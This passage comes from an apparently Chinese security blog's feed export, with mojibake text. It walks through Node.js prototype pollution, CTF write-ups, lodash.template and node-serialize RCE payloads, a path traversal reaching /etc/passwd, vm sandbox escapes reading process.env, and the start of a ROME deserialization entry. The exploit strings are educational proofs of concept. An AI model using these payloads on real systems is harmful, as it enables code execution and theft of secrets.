ä¸ºåœ¨ç»™object2èµ‹å€¼çš„æ—¶å€™ï¼Œ<code>__proto__</code>ä»£è¡¨object2çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´<code>object2 = &#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;</code>ï¼Œæ˜¯æŠŠobject2çš„åŸå‹ä»Objectæ¢æˆäº†<code>&#123;&quot;b&quot;: 2&#125;</code>å¯¹è±¡ã€‚o3å¹¶æ²¡æœ‰ç»§æ‰¿<code>&#123;&quot;b&quot;: 2&#125;</code>ï¼Œè€Œæ˜¯ç»§æ‰¿çš„Objectï¼Œæ‰€ä»¥æ²¡æœ‰è¢«æ±¡æŸ“ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯<code>__proto__</code>æ²¡æœ‰è¢«å½“æˆé”®åï¼Œè€Œæ˜¯è¢«è§£æäº†</p><p>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ã€‚åœ¨èµ‹å€¼æ—¶ç­‰äº<code>o2.__proto__.b=2</code>ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚<code>console.log(o3.b)</code>è¾“å‡º<code>2</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line"><span class="comment">//1 2</span></span><br><span class="line"><span class="comment">//2</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸‹åˆ—åº“ä¸­ï¼Œå‡å­˜åœ¨åŸå‹é“¾æ±¡æŸ“é—®é¢˜</p><p><strong>1. Merge function</strong></p><ul><li><p>hoek<br> <strong>hoek.merge</strong><br> <strong>hoek.applyToDefaults</strong><br> Fixed in version 4.2.1<br> Fixed in version 5.0.3</p></li><li><p>lodash<br> <strong>lodash.defaultsDeep</strong><br> <strong>lodash.merge</strong><br> <strong>lodash.mergeWith</strong><br> <strong>lodash.set</strong><br> <strong>lodash.setWith</strong><br> Fixed in version 4.17.5</p></li><li><p>merge<br> <strong>merge.recursive</strong><br> Not fixed. Package maintainer didnâ€™t respond to the disclosure.</p></li><li><p>defaults-deep<br> <strong>defaults-deep</strong><br> Fixed in version 0.2.4</p></li><li><p>merge-objects<br> <strong>merge-objects</strong><br> Not fixed. Package maintainer didnâ€™t respond to the disclosure.</p></li><li><p>assign-deep<br> <strong>assign-deep</strong><br> Fixed in version 0.4.7</p></li><li><p>merge-deep<br> <strong>Merge-deep</strong><br> Fixed in version 3.0.1</p></li><li><p>mixin-deep<br> <strong>mixin-deep</strong><br> Fixed in version 1.3.1</p></li><li><p>deep-extend<br> <strong>deep-extend</strong><br> Not fixed. Package maintainer didnâ€™t respond to the disclosure.</p></li><li><p>merge-options<br> <strong>merge-options</strong><br> Not fixed. Package maintainer didnâ€™t respond to the disclosure.</p></li><li><p>deap<br> <strong>deap.extend</strong><br> <strong>deap.merge</strong><br> <strong>deap</strong><br> Fixed in version 1.0.1</p></li><li><p>merge-recursive</p><p><strong>merge-recursive.recursive</strong></p><p>Not fixed. Package maintainer didnâ€™t respond to the disclosure.</p></li></ul><p><strong>2. Clone</strong></p><ul><li>deap<br> <strong>deap.clone</strong><br> Fixed in version 1.0.1</li></ul><p><strong>3. Property definition by path</strong></p><ul><li>lodash<br> <strong>lodash.set</strong><br> <strong>lodash.setWith</strong></li><li>pathval<br> <strong>pathval.setPathValue</strong><br> <strong>pathval</strong></li><li>dot-prop<br> <strong>dot-prop.set</strong><br> <strong>dot-prop</strong></li><li>object-path<br> <strong>object-path.withInheritedProps.ensureExists</strong><br> <strong>object-path.withInheritedProps.set</strong><br> <strong>object-path.withInheritedProps.insert</strong><br> <strong>object-path.withInheritedProps.push</strong><br> <strong>object-path</strong></li></ul><h3 id="CATCTF-2022-wife"><a href="#CATCTF-2022-wife" class="headerlink" title="CATCTF 2022 wife"></a>CATCTF 2022 wife</h3><p>é¶åœºï¼š<a href="https://adworld.xctf.org.cn/challenges/details?hash=e5ba95f8-884a-11ed-ab28-000c29bc20bf&task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=e5ba95f8-884a-11ed-ab28-000c29bc20bf&amp;task_category_id=3</a></p><p>æ³¨å†Œéƒ¨åˆ†çš„ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>jsonè§£æåï¼Œåˆ©ç”¨Object.assign()åˆ›å»ºå­ç±»newUserï¼Œpushè¿›users</p><p>è¿™é‡Œä¼ å…¥payload:<code>&quot;__proto__&quot;&#123;&quot;isAdmin&quot;:true&#125;</code>é€ æˆåŸå‹é“¾æ±¡æŸ“ï¼Œç”Ÿæˆçš„userç”¨æˆ·æ‹¥æœ‰isAdmin&#x3D;true<br><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/df570f457215733b422d11b049586779.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/df570f457215733b422d11b049586779.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h3><p><a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><p>npmä¸‹ä¸äº†expressçš„ï¼Œæ‰§è¡Œ<code>npm i gulp-connect@5.6.1</code></p><p>ç„¶åç¼–è¾‘é…ç½®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927180031882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927180031882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927180031882"></p><p>é‡ç‚¹çœ‹ä¸‹server.jsï¼Œå®šä¹‰äº†ä¸€ä¸ªå¤„ç†æ ¹è·¯å¾„è¯·æ±‚çš„è·¯ç”±ï¼Œè°ƒç”¨lodashs.mergeå¯¹POST bodyå’Œdataè¿›è¡Œå¤„ç†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927195810158.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927195810158.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927195810158"></p><p>è€Œdataçš„å®šä¹‰åœ¨ä¸Šä¸€æ’</p><p>data åŒ…å«ä¸¤ä¸ªå±æ€§ï¼šlanguage å’Œ categoryï¼Œå®ƒä»¬éƒ½æ˜¯æ•°ç»„ç±»å‹ã€‚</p><p>å¦‚æœä¼šè¯ä¸­æ²¡æœ‰ dataï¼Œåˆ™åˆå§‹åŒ–ä¸º<code> &#123;language: [], category: []&#125;</code>ã€‚å¦åˆ™ä»sessionä¸­æå–</p><p>è€Œä¸”ä¹Ÿæ»¡è¶³JSONè§£æè¯·æ±‚ä½“ï¼Œä½¿ç”¨äº†body-parserå¤„ç†URLç¼–ç å’ŒJSONè¯·æ±‚ä½“ï¼Œå·²ç»æ»¡è¶³äº†åŸå‹é“¾æ±¡æŸ“çš„æ¡ä»¶äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927201011765.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927201011765.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927201011765"></p><p>åŸå‹é“¾æ±¡æŸ“æ˜¯æœ‰äº†ï¼Œè¿˜æ²¡æ‰¾åˆ°èƒ½å‘½ä»¤æ‰§è¡Œçš„ç‚¹</p><p>okï¼Œé€šè¯»ä¸€ä¸‹ä»£ç </p><p>å…ˆè®¾ç½®sessionï¼Œå†å®šä¹‰äº†ä¸€ä¸ªEJSæ¨¡æ¿å¼•æ“ã€‚è¯¥æ¨¡æ¿å¼•æ“è¯»å–æ–‡ä»¶ï¼Œå¹¶ç”¨lodashåº“å°†æ–‡ä»¶ç¼–è¯‘ä¸ºå‡½æ•°ã€‚æŠŠoptionså‚æ•°ä¼ é€’ç»™ç¼–è¯‘åçš„å‡½æ•°</p><p>å†app.setè®¾ç½®äº†è§†å›¾ç›®å½•ä¸º.&#x2F;viewsï¼Œå¹¶æŠŠåˆšæ‰å®šä¹‰çš„ejsæŒ‡å®šä¸ºè§†å›¾å¼•æ“</p><p>æœ€åæ˜¯å¤„ç†æ ¹ç›®å½•è¯·æ±‚çš„æ–¹æ³•ã€‚åˆ·æ–°dataæ•°æ®åä¼ åˆ°indexï¼Œè¿™é‡Œindexæ˜¯æ¨¡æ¿æ–‡ä»¶åï¼Œå®é™…ä¸ŠåŒ…å«æ‰©å±•åæ˜¯index.ejsã€‚</p><p>å› æ­¤ï¼Œdataæ›´æ–°åï¼ŒExpressä¼šè‡ªåŠ¨åœ¨viewsç›®å½•æŸ¥æ‰¾index.ejsæ–‡ä»¶ï¼Œå¹¶è°ƒç”¨lodash.templateæŠŠè¯¥æ–‡ä»¶è½¬ä¸ºå‡½æ•°ï¼ŒæŠŠ<code>&#123; language: data.language, category: data.category &#125; </code>ä¸­çš„æ•°æ®æ¸²æŸ“è¿›æ¨¡æ¿ä¸­çš„ç›¸åº”ä½ç½®ã€‚</p><p>é¡µé¢æœ€ç»ˆé€šè¿‡lodash.templateè¿›è¡Œæ¸²æŸ“ï¼Œä½ å¯ä»¥åœ¨lodash.js templateså‡½æ•°æŸ¥çœ‹é€»è¾‘ï¼Œä¹Ÿå¯ä»¥åœ¨lodash&#x2F;template.jsï¼Œä¹Ÿå¯ä»¥æ‰“ä¸Šæ–­ç‚¹è·Ÿè¸ª</p><p>çœ‹åˆ°æœ‰ä¸ªè‡ªæ‰§è¡Œå‡½æ•°ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220053182.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220053182.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927220053182"></p><p>æ§åˆ¶sourceURLæˆ–è€…sourceå°±èƒ½æ‰§è¡Œä»»æ„ä»£ç </p><p>å‘ä¸Šä¸€çœ‹ï¼Œæˆ‘æ“ï¼Œä¸€å †ç»™sourceèµ‹å€¼çš„ä»£ç ã€‚</p><p>sourceURLå°±å¾ˆå¹²å‡€ï¼Œoptionsé»˜è®¤ä¸ºundefinedï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ±¡æŸ“options.sourceURL</p><p><code>sourceURL = &#39;//# sourceURL= options.sourceURL&#39;</code>ï¼Œå°±èƒ½æ‰§è¡Œä»»æ„ä»£ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220958006.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220958006.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927220958006"></p><p>ä»æ§åˆ¶å°çœ‹åˆ°optionsæ˜¯Object</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927222038209.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927222038209.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927222038209"></p><p>æˆ‘ä»¬é€šè¿‡ä¹‹å‰çš„æ ¹ç›®å½•è·¯ç”±ï¼Œæ±¡æŸ“Objectï¼Œä½¿å…¶sourceURLå±æ€§ä¸º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;sourceURL&quot;</span>:<span class="string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>è®°å¾—å‰é¢åŠ æ¢è¡Œï¼Œå› ä¸º<code>//# sourceURL= options.sourceURL</code>å‰é¢æœ‰æ³¨é‡Šï¼Œå°¾éƒ¨ä¹Ÿè®°å¾—åŠ <code>//</code>ï¼Œæ³¨é‡Šåé¢çš„ä»£ç ï¼Œé¿å…å‡ºé”™ã€‚ç”±äºFunction ç¯å¢ƒä¸‹æ²¡æœ‰ require å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨require(â€˜child_processâ€™) ä¼šæŠ¥é”™</p><p>æ³¨æ„ï¼Content-Typeéœ€è¦æ”¹ä¸º<code>application/json</code></p><h2 id="node-serialize-ååºåˆ—åŒ–RCE-CVE-2017-5941"><a href="#node-serialize-ååºåˆ—åŒ–RCE-CVE-2017-5941" class="headerlink" title="node-serialize ååºåˆ—åŒ–RCE(CVE-2017-5941)"></a>node-serialize ååºåˆ—åŒ–RCE(CVE-2017-5941)</h2><p>æ¼æ´ç‰ˆæœ¬ï¼šnode-serializeæ¨¡å—&#x3D;&#x3D;0.0.4</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install node-serialize@0.0.4</span><br></pre></td></tr></table></figure><p>æ¼æ´ä»£ç ä½äºnode_modules\node-serialize\lib\serialize.jsä¸­s</p><p>ç›´æ¥çœ‹åˆ°æ‰§è¡Œä»£ç çš„åœ°æ–¹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928211918215.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928211918215.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928211918215"></p><p>è¯»ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š</p><ul><li>å¦‚æœè¾“å…¥ä¸ºå­—ç¬¦ä¸²ï¼Œç”¨JSON.parseè½¬æ¢ä¸ºå¯¹è±¡</li><li>éå†å¯¹è±¡çš„å±æ€§ï¼Œé€’å½’ååºåˆ—åŒ–åµŒå¥—çš„å¯¹è±¡</li><li>å¦‚æœå±æ€§å€¼ä»¥<code>_$$ND_FUNC$$_</code>å¼€å¤´ï¼Œåˆ™æ‰§è¡Œeval</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928214539463.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928214539463.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928214539463"></p><p>evalå‰åç”¨æ‹¬å·åŒ…è£¹ï¼Œå¦‚æœobjæ˜¯å¤–éƒ¨å‚æ•°ï¼Œé‚£æˆ‘ä»¬ä¸­é—´æ˜¯ä¸æ˜¯å¯ä»¥å¥—ä¸€ä¸ªè‡ªæ‰§è¡Œå‡½æ•°ï¼Ÿ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// â€¦</span></span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹codeå°±èƒ½å¼¹è®¡ç®—å™¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> node_serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>)</span><br><span class="line">obj = &#123;<span class="string">&quot;any&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&#125;()&quot;</span>&#125;</span><br><span class="line">node_serialize.<span class="title function_">unserialize</span>(obj)</span><br></pre></td></tr></table></figure><h2 id="CVE-2017-14849ç›®å½•ç©¿è¶Š"><a href="#CVE-2017-14849ç›®å½•ç©¿è¶Š" class="headerlink" title="CVE-2017-14849ç›®å½•ç©¿è¶Š"></a>CVE-2017-14849ç›®å½•ç©¿è¶Š</h2><ul><li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li><li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li></ul><p>é‡åˆ°äº†è¯•ä¸€ä¸‹å°±å®Œäº†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">static</span>/../../../a/../../../../etc/passwd</span><br></pre></td></tr></table></figure><h2 id="vmæ²™ç®±é€ƒé€¸"><a href="#vmæ²™ç®±é€ƒé€¸" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h2><p>ç”¨vmåº“å¯ä»¥åˆ›å»ºä¸€ä¸ªæ²™ç®±sandboxï¼Œé˜»æ­¢æ²™ç®±ç¨‹åºå½±å“åˆ°è¿›ç¨‹</p><p>å¦‚ä¸‹ä»£ç ï¼Œåˆ›å»ºæ²™ç®±æ‰§è¡Œä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">env = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure><p>åˆ›å»ºvmç¯å¢ƒæ—¶ï¼Œè¦å…ˆåˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡sandboxã€‚è¿™ä¸ªå¯¹è±¡å°±æ˜¯vmè„šæœ¬æ‰§è¡Œçš„å…¨å±€ç¯å¢ƒcontextï¼ŒScriptä¸­çš„thisï¼Œåœ¨æ‰§è¡Œ<code>script.runInContext(context);</code>æ—¶å°±æŒ‡çš„sandbox</p><p>sandbox.constructoræŒ‡sanboxçš„æ„é€ å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯Object</p><p>sandbox.constructor.constructoræŒ‡Object.constructorï¼Œä¹Ÿå°±æ˜¯Functionï¼Œè¡¨ç¤ºObjectçš„æ„é€ å‡½æ•°å¯¹è±¡æœ¬èº«</p><p>Function(â€˜return this.process.envâ€™)()å°±æ˜¯ä¸ªè‡ªæ‰§è¡Œå‡½æ•°</p><p>å³é‡åˆ°vmæ²™ç®±ï¼Œä¹Ÿèƒ½æ‰§è¡Œæ²™ç®±å¤–çš„ä»£ç ã€‚ä¸Šè¿°ä»£ç èƒ½ç”¨runInNewContextä»£æ›¿</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure><p>é…åˆ<code>chile_process.exec()</code>å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();</span></span><br><span class="line"><span class="string">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure><h2 id="CVE-2019-10758-mongo-express-RCE"><a href="#CVE-2019-10758-mongo-express-RCE" class="headerlink" title="CVE-2019-10758:mongo-express RCE"></a>CVE-2019-10758:mongo-express RCE</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install mongo-express@<span class="number">0.53</span><span class="number">.0</span> </span><br></pre></td></tr></table></figure><p>vmé€ƒé€¸</p><p><a href="https://xz.aliyun.com/t/7056">https://xz.aliyun.com/t/7056</a></p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROMEé“¾(ToStringBean&amp;EqualsBean)</title>
      <link href="/2024/09/26/rome-lian/"/>
      <url>/2024/09/26/rome-lian/</url>
      
        <content type="html"><![CDATA[<p>ROME æ˜¯ä¸€ä¸ªå…³äº RSS å’Œ Atom æ ¼å¼çš„ java æ¡†æ¶</p><p>é‚£ä»€ä¹ˆæ˜¯ RSS å’Œ Atom å‘¢ï¼Ÿ</p><p>RSS å…¨ç§°ï¼šRDF Site Summary æˆ– Really Simple Syndicationï¼Œä¸­æ–‡ç¿»è¯‘ä¸ºç®€æ˜“ä¿¡æ¯èšåˆï¼Œä¹Ÿå«åšèšåˆå†…å®¹ã€‚å®ƒæ˜¯ä¸€ç§æ¶ˆæ¯æ¥æºçš„<strong>æ ¼å¼</strong>,ä¸»è¦ä½œç”¨ç”¨åœ¨èšåˆå¤šä¸ªç½‘ç«™çš„æ›´æ–°å†…å®¹ï¼Œå¹¶ä¸”èƒ½å¤Ÿè‡ªåŠ¨é€šçŸ¥ç½‘ç«™è®¢é˜…è€…ã€‚åŒæ—¶ RSS èƒ½å¤Ÿä»¥æ‘˜è¦çš„å½¢å¼å°†ä¿¡æ¯å‘ˆç°ï¼Œå¸®åŠ©è®¢é˜…è€…å¿«é€Ÿæ¸¸è§ˆã€‚</p><p>Atom å…·ä½“çš„åç§°æ˜¯ Atom Syndication Format ï¼Œä¸­æ–‡è¯‘ä¸º Atom ä¾›ç¨¿æ ¼å¼ã€‚Atom çš„è¯ç”Ÿæ˜¯ä¸ºäº†è§£å†³ RSS åœ¨å„ä¸ªç‰ˆæœ¬é‡åˆ°çš„é—®é¢˜ï¼Œé™ä½ web å†…å®¹èšåˆçš„éš¾åº¦ï¼Œç‰¹åœ°ç‰¹å‡ºæ¥çš„ä¸€ç§ä¿¡æ¯æ ¼å¼ã€‚</p><p>RSS çš„å†…å®¹éœ€è¦é€šè¿‡ RSS é˜…è¯»å™¨æŸ¥çœ‹ï¼Œè€Œ ROME å°±æ˜¯å…¶ä¸­ä¸€ä¸ªæ¯”è¾ƒè€çš„ RSS é˜…è¯»å™¨äº†ã€‚</p><p>ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å½±å“ç‰ˆæœ¬ä¸é€ ï¼Œåº”è¯¥æ˜¯rome&lt;&#x3D;1.0</p><h2 id="ROMEæ¼æ´ç‚¹"><a href="#ROMEæ¼æ´ç‚¹" class="headerlink" title="ROMEæ¼æ´ç‚¹"></a>ROMEæ¼æ´ç‚¹</h2><h3 id="com-sun-syndication-feed-impl-ToStringBean-toString"><a href="#com-sun-syndication-feed-impl-ToStringBean-toString" class="headerlink" title="com.sun.syndication.feed.impl.ToStringBean#toString"></a>com.sun.syndication.feed.impl.ToStringBean#toString</h3><p>ä½äºcom.sun.syndication.feed.impl.ToStringBeançš„toStringæ–¹æ³•ï¼Œå¯ä»¥invokeåå°„æ‰§è¡Œæ–¹æ³•ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153029644.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153029644.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬å®Œæ•´çš„è¯»ä¸€ä¸‹è¿™ä¸ªtoStringæ–¹æ³•</p><p>å…ˆè°ƒç”¨BeanIntrospector.getPropertyDescriptorsï¼Œæ¥ç€è°ƒç”¨getPDs</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153400088.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153400088.png" 